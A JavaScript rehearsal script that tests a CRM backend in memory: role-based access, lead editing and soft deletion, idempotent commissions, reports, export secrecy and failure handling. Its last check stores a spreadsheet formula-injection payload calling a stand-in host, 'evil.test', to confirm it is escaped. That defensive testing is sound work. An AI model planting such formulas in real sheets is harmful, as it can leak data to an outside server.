/**
 * Full workflow rehearsal against a copy of the REAL CRM data.
 *
 *   npm run rehearse                       # built-in fixtures
 *   npm run rehearse -- local/.data/crm-export.json
 *
 * The unit suites prove individual rules. This walks the CRM the way people
 * actually use it — log in as each role, work a lead, win a deal, run the
 * reports — against your real records, and reports anything that misbehaves.
 *
 * Everything runs in memory. Production is never contacted, and the source
 * export is only ever read.
 */
import fs from 'node:fs';
import path from 'node:path';
import { loadBackend } from '../harness/backend.mjs';
import { seedFixtures } from '../fixtures/dataset.mjs';

const dataFile = process.argv[2] || path.join('local', '.data', 'crm-export.json');

/* ---------------- harness ---------------- */

const results = [];
let currentGroup = '';

const group = (name) => { currentGroup = name; console.log(`\n${name}`); };

function check(label, fn) {
  try {
    const detail = fn();
    results.push({ group: currentGroup, label, ok: true });
    console.log(`  PASS  ${label}${detail ? `  — ${detail}` : ''}`);
  } catch (err) {
    results.push({ group: currentGroup, label, ok: false, error: err.message });
    console.log(`  FAIL  ${label}`);
    console.log(`        ${err.message}`);
  }
}

const must = (cond, msg) => { if (!cond) throw new Error(msg); };
const eq = (a, b, msg) => must(a === b, `${msg} (got ${JSON.stringify(a)}, expected ${JSON.stringify(b)})`);

/* ---------------- boot ---------------- */

const be = loadBackend({
  scriptProperties: {
    ZOHO_CLIENT_ID: 'LOCAL_TEST_CLIENT_ID',
    ZOHO_CLIENT_SECRET: 'LOCAL_TEST_CLIENT_SECRET',
    PASSWORD_ITERATIONS: '100',
    ENVIRONMENT: 'test',
    CRM_TIMEZONE: 'Asia/Kolkata',
  },
  zoho: { clientId: 'LOCAL_TEST_CLIENT_ID', clientSecret: 'LOCAL_TEST_CLIENT_SECRET' },
});

be.call('setupCRMDatabase');

let source;
if (fs.existsSync(dataFile)) {
  const raw = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
  for (const [sheet, rows] of Object.entries(raw)) {
    if (!be.store.hasSheet(sheet)) continue;
    const s = be.store.getSheet(sheet);
    s.rows = [s.headers];
    for (const row of rows) be.store.insert(sheet, row);
  }
  source = dataFile;
} else {
  seedFixtures(be);
  source = 'built-in fixtures';
}

const PW = 'RehearsalPass123';
const users = be.rows('Users').filter((u) => String(u.ID || ''));
for (const u of users) {
  if (String(u.Status) !== 'Active') continue;
  try { be.call('setUserPassword', u.ID, PW, { mustChange: false }); } catch { /* skip */ }
}
be.call('setAuthEnforcement', 'on');

const pick = (role) => users.find((u) => u.Role === role && u.Status === 'Active');
const superAdmin = pick('SUPER_ADMIN');
const admin = pick('ADMIN');
const rep = pick('SALES_REP');
const setter = pick('SETTER');

const login = (u) => {
  const r = be.post({ action: 'login', payload: { username: u.Username, password: PW } });
  if (r.status !== 'success') throw new Error(`login failed for ${u.Username}: ${r.code}`);
  return r.data.token;
};
const P = (token, action, payload = {}) => be.post({ action, payload, token });
const G = (token, action, params = {}) => be.get({ action, token, ...params });

console.log('\n==================================================');
console.log('  CRM WORKFLOW REHEARSAL');
console.log('==================================================');
console.log(`  data     ${source}`);
console.log(`  users    ${users.length}`);
console.log(`  leads    ${be.rows('Leads').filter((l) => String(l.ID || '')).length}`);
console.log(`  roles    SUPER_ADMIN=${superAdmin?.Username ?? '-'}  ADMIN=${admin?.Username ?? '-'}`);
console.log(`           SALES_REP=${rep?.Username ?? '-'}  SETTER=${setter?.Username ?? '-'}`);
console.log(`  target   in-memory copy — production NOT contacted`);

/* ---------------- 1. authentication ---------------- */

group('1. Authentication');

let suT, adminT, repT, setterT;

check('super admin can sign in', () => { suT = login(superAdmin); return superAdmin.Username; });
if (admin) check('admin can sign in', () => { adminT = login(admin); return admin.Username; });
if (rep) check('sales rep can sign in', () => { repT = login(rep); return rep.Username; });
if (setter) check('setter can sign in', () => { setterT = login(setter); return setter.Username; });

check('a wrong password is refused', () => {
  const r = be.post({ action: 'login', payload: { username: superAdmin.Username, password: 'wrong-one' } });
  eq(r.code, 'INVALID_CREDENTIALS', 'expected INVALID_CREDENTIALS');
});

check('an unknown user gets the same message (no enumeration)', () => {
  const a = be.post({ action: 'login', payload: { username: superAdmin.Username, password: 'x' } });
  const b = be.post({ action: 'login', payload: { username: 'nobody_here', password: 'x' } });
  eq(a.message, b.message, 'messages differ, which lets someone probe for valid usernames');
});

check('signed-out requests are refused', () => {
  eq(be.get({ action: 'getLeads' }).code, 'UNAUTHENTICATED', 'expected UNAUTHENTICATED');
});

check('a forged token is refused', () => {
  eq(be.get({ action: 'getLeads', token: 'made-up-token' }).code, 'UNAUTHENTICATED', 'forged token accepted');
});

/* ---------------- 2. visibility ---------------- */

group('2. What each role can see');

const leadCount = (t) => (G(t, 'getLeads').data || []).length;
const allLeads = be.rows('Leads').filter((l) => String(l.ID || '') && String(l.Deleted || '') !== 'TRUE').length;

check('super admin sees every lead', () => {
  eq(leadCount(suT), allLeads, 'super admin should see all leads');
  return `${allLeads} leads`;
});

if (adminT) {
  check('admin sees their team (0 means teams are not set up)', () => {
    const n = leadCount(adminT);
    if (n === 0) {
      throw new Error(
        'the admin sees NO leads. Nobody who owns a lead shares their team. ' +
        'Fix in Admin -> Team Structure, or run: npm run check:teams'
      );
    }
    return `${n} of ${allLeads} leads`;
  });
}

if (repT) {
  check('rep sees only their own leads', () => {
    const n = leadCount(repT);
    must(n < allLeads, 'a rep should not see every lead');
    return `${n} of ${allLeads}`;
  });
}

check('finance is super-admin only', () => {
  eq(G(suT, 'getKPIs').status, 'success', 'super admin should reach finance');
  if (adminT) eq(G(adminT, 'getKPIs').code, 'FORBIDDEN', 'admin reached finance');
  if (repT) eq(G(repT, 'getKPIs').code, 'FORBIDDEN', 'rep reached finance');
});

check('a rep cannot promote themselves', () => {
  if (!repT) return 'no rep to test';
  const r = P(repT, 'updateUser', { id: rep.ID, Role: 'SUPER_ADMIN' });
  eq(r.code, 'FORBIDDEN', 'privilege escalation was allowed');
  eq(be.rows('Users').find((u) => u.ID === rep.ID).Role, 'SALES_REP', 'role changed');
});

check('no response ever carries a password hash or Zoho token', () => {
  for (const [name, t] of [['super admin', suT], ['admin', adminT], ['rep', repT]]) {
    if (!t) continue;
    const body = JSON.stringify(G(t, 'getUsers').data ?? []);
    for (const secret of ['PasswordHash', 'PasswordSalt', 'ZohoRefreshToken']) {
      must(!body.includes(secret), `${name} received ${secret}`);
    }
  }
});

/* ---------------- 3. working a lead ---------------- */

group('3. Working a lead');

// A lead the rep owns and that has no deal, so it is safe to exercise.
const dealLeadIds = new Set(be.rows('Deals').map((d) => String(d.LeadId)));
const workable = be.rows('Leads').find(
  (l) => String(l.ID || '') && String(l.Deleted || '') !== 'TRUE' && !dealLeadIds.has(String(l.ID))
);

check('a lead is available to work with', () => {
  must(workable, 'no lead without a deal was found in this dataset');
  return workable.Name;
});

if (workable) {
  const ownerT = suT; // super admin can act on any lead

  check('notes can be updated', () => {
    const r = P(ownerT, 'updateLead', { id: workable.ID, Notes: 'Rehearsal note.' });
    eq(r.status, 'success', r.message);
    eq(be.rows('Leads').find((l) => l.ID === workable.ID).Notes, 'Rehearsal note.', 'note not saved');
  });

  check('a bad email is rejected', () => {
    const r = P(ownerT, 'updateLead', { id: workable.ID, Email: 'not-an-email' });
    eq(r.code, 'VALIDATION_FAILED', 'invalid email was accepted');
  });

  check('legacy data does not block an edit', () => {
    // Many real leads hold values that predate validation. Editing one field
    // must not fail because a DIFFERENT field is historically invalid.
    be.call('updateRecordRaw', 'Leads', workable.ID, { Email: 'n.a. - none published' });
    const r = P(ownerT, 'updateLead', { id: workable.ID, Notes: 'Still editable.' });
    eq(r.status, 'success', 'a notes-only edit was blocked by a legacy value');
  });

  check('a follow-up is logged with its contact channel', () => {
    const r = P(ownerT, 'completeFollowUp', { leadId: workable.ID, contactMode: 'CALL', outcome: 'Rehearsal call.' });
    eq(r.status, 'success', r.message);
    const log = be.rows('Logs').find((l) => l.Action === 'FOLLOWUP_COMPLETED');
    must(log, 'no FOLLOWUP_COMPLETED event was written');
    eq(log.ContactMode, 'CALL', 'contact channel not recorded');
  });

  check('clicking complete twice records one completion', () => {
    P(ownerT, 'completeFollowUp', { leadId: workable.ID });
    P(ownerT, 'completeFollowUp', { leadId: workable.ID });
    const n = be.rows('Logs').filter((l) => l.Action === 'FOLLOWUP_COMPLETED').length;
    eq(n, 1, `expected 1 completion event, found ${n}`);
  });

  if (repT) {
    check('a rep cannot rename a lead', () => {
      const before = be.rows('Leads').find((l) => l.ID === workable.ID).Name;
      P(repT, 'updateLead', { id: workable.ID, Name: 'Renamed By Rep' });
      eq(be.rows('Leads').find((l) => l.ID === workable.ID).Name, before, 'a rep renamed a lead');
    });
  }

  check('a rep CAN create a lead with contact details', () => {
    if (!repT) return 'no rep to test';
    const r = P(repT, 'createLead', { Name: 'Rehearsal Prospect', Email: 'hi@rehearsal.test', Status: 'New' });
    eq(r.status, 'success', r.message);
    eq(be.rows('Leads').find((l) => l.ID === r.data.ID).Name, 'Rehearsal Prospect', 'the name was stripped');
  });
}

/* ---------------- 4. deleting a lead ---------------- */

group('4. Deleting a lead');

const deletable = be.rows('Leads').find(
  (l) => String(l.ID || '') && String(l.Deleted || '') !== 'TRUE' &&
         !dealLeadIds.has(String(l.ID)) && l.ID !== workable?.ID
);

if (!deletable) {
  console.log('  SKIP  no spare lead to delete in this dataset');
} else {
  check('a rep cannot delete', () => {
    if (!repT) return 'no rep to test';
    eq(P(repT, 'deleteLead', { leadId: deletable.ID }).code, 'FORBIDDEN', 'a rep deleted a lead');
  });

  check('a manager deletes, and the row survives', () => {
    const before = be.store.getSheet('Leads').dataRows.length;
    const r = P(suT, 'deleteLead', { leadId: deletable.ID, reason: 'Rehearsal.' });
    eq(r.status, 'success', r.message);
    eq(be.store.getSheet('Leads').dataRows.length, before, 'a row was physically removed');
    eq(be.rows('Leads').find((l) => l.ID === deletable.ID).Deleted, 'TRUE', 'not flagged');
  });

  check('it disappears from the CRM', () => {
    must(!(G(suT, 'getLeads').data || []).some((l) => l.ID === deletable.ID), 'still listed');
    eq(G(suT, 'getLeadById', { id: deletable.ID }).code, 'NOT_FOUND', 'still fetchable');
  });

  check('the archive holds who, when, why and a snapshot', () => {
    const entry = (P(suT, 'getDeletedLeads', {}).data || []).find((d) => d.LeadId === deletable.ID);
    must(entry, 'no archive entry');
    eq(entry.Reason, 'Rehearsal.', 'reason not stored');
    must(JSON.parse(entry.Snapshot).Name, 'snapshot missing the name');
    return `archived by ${entry.DeletedByUsername}`;
  });

  check('restoring brings it back intact', () => {
    const name = JSON.parse((P(suT, 'getDeletedLeads', {}).data || [])
      .find((d) => d.LeadId === deletable.ID).Snapshot).Name;
    eq(P(suT, 'restoreLead', { leadId: deletable.ID }).status, 'success', 'restore failed');
    const back = (G(suT, 'getLeads').data || []).find((l) => l.ID === deletable.ID);
    must(back, 'not restored');
    eq(back.Name, name, 'the name changed during restore');
  });
}

check('a lead with a deal cannot be deleted', () => {
  const withDeal = be.rows('Leads').find((l) => dealLeadIds.has(String(l.ID)));
  if (!withDeal) return 'no converted lead in this dataset';
  eq(P(suT, 'deleteLead', { leadId: withDeal.ID }).code, 'CONFLICT', 'an orphan deal would have been created');
});

/* ---------------- 5. money ---------------- */

group('5. Deals and commissions');

const openDeal = be.rows('Deals').find(
  (d) => String(d.ID || '') && be.call('normaliseDealStatus', d.Status) === 'Open'
);

if (!openDeal) {
  console.log('  SKIP  no open deal in this dataset');
} else {
  check('only a super admin can mark a deal won', () => {
    if (adminT) eq(P(adminT, 'markDealWon', { dealId: openDeal.ID }).code, 'FORBIDDEN', 'an admin won a deal');
    if (repT) eq(P(repT, 'markDealWon', { dealId: openDeal.ID }).code, 'FORBIDDEN', 'a rep won a deal');
  });

  check('winning it once creates one commission', () => {
    const r = P(suT, 'markDealWon', { dealId: openDeal.ID });
    eq(r.status, 'success', r.message);
    const n = be.rows('Commissions').filter((c) => c.DealId === openDeal.ID).length;
    eq(n, 1, `expected 1 commission, found ${n}`);
  });

  check('clicking won five times still leaves one commission', () => {
    for (let i = 0; i < 5; i++) P(suT, 'markDealWon', { dealId: openDeal.ID });
    const n = be.rows('Commissions').filter((c) => c.DealId === openDeal.ID).length;
    eq(n, 1, `retries created ${n} commissions`);
  });

  check('a payout settles once', () => {
    const comm = be.rows('Commissions').find((c) => c.DealId === openDeal.ID);
    P(suT, 'processCommission', { commissionId: comm.ID });
    P(suT, 'processCommission', { commissionId: comm.ID });
    const n = be.rows('Logs').filter((l) => l.Action === 'PAYOUT_PROCESSED').length;
    eq(n, 1, `expected 1 payout event, found ${n}`);
  });

  check('a paid commission cannot be revised', () => {
    eq(P(suT, 'reviseCommission', { dealId: openDeal.ID, setterAmount: 999999 }).code,
       'CONFLICT', 'a settled payout was edited');
  });
}

/* ---------------- 6. reports ---------------- */

group('6. Reports');

check('productivity reports in the viewer timezone', () => {
  const r = G(suT, 'getProductivity', { days: '3650', timeZone: 'Asia/Kolkata' });
  eq(r.status, 'success', r.message);
  eq(r.data.timeZone, 'Asia/Kolkata', 'timezone not honoured');
  return `${r.data.users.length} people`;
});

check('a rep sees only their own numbers', () => {
  if (!repT) return 'no rep to test';
  const r = G(repT, 'getProductivity', {});
  eq(r.data.users.length, 1, `a rep saw ${r.data.users.length} people`);
});

check('analytics is honest about contact-mode coverage', () => {
  const a = G(suT, 'getAnalytics', { days: '3650' }).data;
  const cm = a.contactMode;
  must(cm.trackingSince, 'no tracking start date recorded');
  if (cm.eventsWithoutMode > 0) {
    must(cm.complete === false, 'claims complete coverage while events lack a channel');
  }
  return `${cm.trackedEvents} tracked, ${cm.eventsWithoutMode} without a channel`;
});

check('win rate is blank rather than invented', () => {
  const p = G(suT, 'getAnalytics', { days: '3650' }).data.pipeline;
  if (p.winRate === null) must(p.winRateNote, 'null win rate with no explanation');
  return p.winRate === null ? 'no decided deals — reported as blank' : `${p.winRate}%`;
});

check('the activity feed covers today only', () => {
  const f = G(suT, 'getActivityFeed', {}).data;
  eq(f.scope, 'today', 'feed is not scoped to today');
  const from = Date.parse(f.from);
  for (const e of f.entries) must(Date.parse(e.Timestamp) >= from, 'an older entry leaked into the feed');
  return `${f.count} events today`;
});

/* ---------------- 7. export ---------------- */

group('7. Export');

check('a super admin can export everything', () => {
  const r = P(suT, 'exportAllData', {});
  eq(r.status, 'success', r.message);
  const total = Object.values(r.data.counts).reduce((n, v) => n + Number(v || 0), 0);
  return `${total} records across ${Object.keys(r.data.counts).length} sheets`;
});

check('the export carries no secrets', () => {
  const body = JSON.stringify(P(suT, 'exportAllData', {}).data.entities);
  for (const s of ['PasswordHash', 'PasswordSalt', 'ZohoRefreshToken', 'TokenHash']) {
    must(!body.includes(s), `export leaked ${s}`);
  }
});

check('nobody below super admin can export', () => {
  if (adminT) eq(P(adminT, 'exportAllData', {}).code, 'FORBIDDEN', 'an admin exported');
  if (repT) eq(P(repT, 'exportAllData', {}).code, 'FORBIDDEN', 'a rep exported');
});

/* ---------------- 8. teams ---------------- */

group('8. Team structure');

check('the overview loads', () => {
  const r = P(suT, 'getTeamOverview', {});
  eq(r.status, 'success', r.message);
  return `${r.data.teams.length} team(s), ${r.data.unassigned.length} unassigned`;
});

check('team problems are surfaced, not hidden', () => {
  const w = P(suT, 'getTeamOverview', {}).data.warnings;
  if (w.length === 0) return 'no problems found';
  console.log('');
  for (const line of w) console.log(`        ! ${line}`);
  console.log('');
  return `${w.length} warning(s) — fix in Admin -> Team Structure`;
});

check('a rep cannot read or change team structure', () => {
  if (!repT) return 'no rep to test';
  eq(P(repT, 'getTeamOverview', {}).code, 'FORBIDDEN', 'a rep read the team structure');
  eq(P(repT, 'setUserTeam', { userId: rep.ID, team: 'Anything' }).code, 'FORBIDDEN', 'a rep changed a team');
});

/* ---------------- 9. failure handling ---------------- */

group('9. Failure handling');

check('a database outage is not reported as empty data', () => {
  be.store.faults.arm({ on: 'read', sheet: 'Leads', times: 1 });
  const r = G(suT, 'getLeads');
  be.store.faults.clear();
  eq(r.status, 'error', 'an outage was reported as success');
  eq(r.code, 'STORAGE_ERROR', `expected STORAGE_ERROR, got ${r.code}`);
  eq(r.retryable, true, 'not marked retryable');
});

check('signing out ends the session immediately', () => {
  const t = login(superAdmin);
  eq(G(t, 'getLeads').status, 'success', 'session did not work before logout');
  P(t, 'logout', {});
  eq(G(t, 'getLeads').code, 'UNAUTHENTICATED', 'the token still worked after logout');
});

check('malformed input is rejected cleanly', () => {
  eq(be.postRaw('{not json').code, 'BAD_REQUEST', 'bad JSON was not rejected');
  eq(be.post({ action: 'dropEverything', payload: {} }).code, 'UNKNOWN_ACTION', 'unknown action accepted');
});

check('formula injection is neutralised', () => {
  const r = P(suT, 'createLead', { Name: 'Injection Probe', Notes: '=IMPORTXML("http://evil.test","//x")' });
  eq(r.status, 'success', r.message);
  const row = be.rows('Leads').find((l) => l.ID === r.data.ID);
  must(String(row.Notes).startsWith("'="), 'a formula was stored unescaped');
});

/* ---------------- verdict ---------------- */

const failed = results.filter((r) => !r.ok);

console.log('\n==================================================');
console.log('  RESULT');
console.log('==================================================\n');
console.log(`  ${results.length - failed.length} passed, ${failed.length} failed\n`);

if (failed.length) {
  for (const f of failed) console.log(`  FAIL  [${f.group}] ${f.label}\n        ${f.error}`);
  console.log('\n  Fix these before deploying.\n');
  process.exit(1);
}

console.log('  Every workflow behaved correctly on this dataset.');
console.log('  Production was not contacted at any point.\n');
process.exit(0);
